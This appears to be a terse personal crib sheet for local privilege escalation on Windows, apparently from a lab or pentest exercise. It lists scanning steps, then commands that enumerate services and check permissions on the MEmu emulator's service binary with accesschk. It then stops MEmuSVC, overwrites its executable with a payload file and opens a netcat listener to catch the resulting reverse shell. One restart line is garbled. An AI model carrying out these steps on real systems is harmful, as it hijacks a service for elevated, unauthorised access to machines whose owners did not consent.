(checklist)

- port scan
- version scan
- service scan

COMMANDS:
C:\Users\user\Desktop\Tools\PsInfo.exe /accepteula -s

wmic service get name | findstr /i /v "C:\Windows\\""

C:\Users\user\Desktop\Tools\accesschk64.exe -wvu "C:\Program Files\Microvirt\MEmu\MemuService.exe"

C:\Users\user\Desktop\Tools\accesschk64.exe /accepteula -ucqv user MEmuSVC

net stop MEmuSVC

copy /y usp_payload.exe "C:\Program Files\Microvirt\MEmu\MemuService.exe"

nc -nlvp 4443

net start net stop MEmuSVC

go back to listening terminal